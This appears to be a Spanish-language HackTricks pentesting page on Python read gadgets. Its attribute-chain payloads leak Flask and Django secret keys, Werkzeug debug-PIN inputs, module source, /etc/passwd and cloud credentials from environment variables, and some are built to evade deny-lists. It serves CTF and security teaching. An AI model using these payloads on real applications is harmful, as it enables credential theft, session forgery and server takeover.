# Gadgets de lectura interna de Python

## Información básica

Diferentes vulnerabilidades, como [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) o [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), podrían permitirte **leer datos internos de Python, pero no ejecutar código**. Por lo tanto, un pentester deberá aprovechar al máximo estos permisos de lectura para **obtener privilegios sensibles y escalar la vulnerabilidad**.

### Flask - Leer la secret key

La página principal de una aplicación Flask probablemente tendrá el objeto global **`app`**, donde está configurado este **secret**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
En este caso es posible acceder a este objeto usando cualquier gadget para **acceder a objetos globales** de la [**página Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Si **la vulnerabilidad se encuentra en un archivo python diferente**, necesitas un gadget para recorrer archivos hasta llegar al principal, **acceder al objeto global `app.secret_key`** y poder [**escalate privileges** conociendo esta clave](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Un payload como este [de este writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Usa este payload para **leer `app.secret_key`**. Si el bug original también te proporciona un write primitive (por ejemplo, class pollution), se puede usar el mismo path para reemplazarla y firmar cookies de Flask con más privilegios.

### Werkzeug - machine_id y node uuid

[**Usando estos payloads de este writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) podrás acceder a **machine_id** y al nodo **uuid**, que son los datos **privados** necesarios para [**generar el pin de Werkzeug**](../../network-services-pentesting/pentesting-web/werkzeug.md) y acceder a la consola de Python en `/console` si el **debug mode está habilitado**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Ten en cuenta que puedes obtener la **ruta local del servidor al archivo `app.py`** generando algún **error** en la página web que te **dará la ruta**.

Si la vulnerabilidad se encuentra en un archivo de Python diferente, consulta el truco anterior de Flask para acceder a los objetos del archivo principal de Python.

### Django - SECRET_KEY y módulo de settings

El objeto de configuración de Django se almacena en caché en `sys.modules` una vez que la aplicación se inicia. Con solo primitivas de lectura puedes hacer leak de la **`SECRET_KEY`**, claves de respaldo, credenciales de la base de datos o salts de firma:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Si el gadget vulnerable está en otro módulo, recorre primero los globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` son igual de valiosos que el `SECRET_KEY` actual: siguen validando valores firmados antiguos durante la rotación.<sup>[[1]](#references)</sup> También haz leak de `SESSION_ENGINE` y `SESSION_SERIALIZER` para determinar rápidamente si el impacto se limita a la falsificación de cookies o si es algo más potente. Para consultar los detalles del impacto web, revisa la [**página de pentesting de Django**](../../network-services-pentesting/pentesting-web/django.md).

### Gadgets del cargador de módulos: leer código fuente y archivos

Los módulos de Python cargados normalmente conservan un `__loader__`. Los loaders respaldados por archivos suelen exponer `get_source()` y `get_data()`, que son primitivas perfectas de **solo lectura** cuando ya puedes acceder a un objeto de módulo, pero no a `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Esto es muy útil para hacer dump de **módulos de configuración, blueprints, archivos auxiliares o rutas ocultas** y recuperar API keys, DSNs, rutas de flags o puntos de entrada de gadgets adicionales.

Si solo tienes enumeración de subclases, busca el loader por nombre en lugar de hard-coding de un índice:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals del frame de generator / coroutine

Si puedes crear o alcanzar un objeto generator/coroutine, su frame puede filtrar globals **sin necesitar ningún gadget `__globals__` de una función**. Esto resulta útil contra filtros que solo bloquean nombres dunder y olvidan atributos del frame como `gi_frame`, `ag_frame`, `cr_frame` o `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Una vez que tengas los globals del frame, continúa exactamente como en los otros gadgets (`sys.modules`, objetos de configuración, `os.environ`, etc.). Los escapes de sandbox recientes siguen redescubriendo esto porque `gi_frame` y `f_globals` no son atributos dunder y a menudo sobreviven a los deny-lists ingenuos.

### Variables de entorno / credenciales de cloud mediante módulos cargados

Muchos jails todavía importan `os` o `sys` en algún punto. Puedes abusar de cualquier función accesible `__init__.__globals__` para pivotar al módulo `os` ya importado y volcar **variables de entorno** que contengan tokens de API, claves de cloud o flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Si el índice de subclases está filtrado, usa loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Las variables de entorno son frecuentemente los únicos secretos necesarios para pasar de una lectura a un compromiso total (claves IAM de cloud, URLs de bases de datos, claves de firma, etc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), versiones afectadas `<0.61.0`) permitía **class pollution** mediante requests de componentes manipuladas. Una ruta de propiedad como `__init__.__globals__` podía alcanzar los globals del módulo del componente y los módulos importados; el advisory demuestra la sobrescritura de `SECRET_KEY` de Django y de valores en `os.environ`, en lugar de un exploit de solo lectura.<sup>[[5]](#references)</sup> Si un bug independiente proporciona acceso de lectura al mismo grafo de objetos, esos globals pueden exponer configuración y credenciales sin requerir ejecución de código.

### Colecciones de gadgets para chaining

CTF recientes y la investigación sobre pyjail muestran cadenas de lectura fiables construidas únicamente con acceso a atributos y enumeración de subclases. Listas mantenidas por la comunidad, como [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), catalogan cientos de gadgets mínimos que se pueden combinar para atravesar desde objetos hasta `__globals__`, `sys.modules` y, finalmente, datos sensibles.<sup>[[2]](#references)</sup> Es preferible utilizar búsquedas basadas en **atributos/nombres** en lugar de índices de subclases sin procesar, porque la posición de `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, etc. cambia entre versiones de Python y con bibliotecas importadas adicionales.

## References

- [1] [Documentación sobre firmas criptográficas de Django](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki de gadgets de Python](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / administrador de tareas / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – Writeup de FCSC 2023](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Vulnerabilidad de Class Pollution de Django-Unicorn, que conduce a RCE, XSS, DoS y bypass de autenticación (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
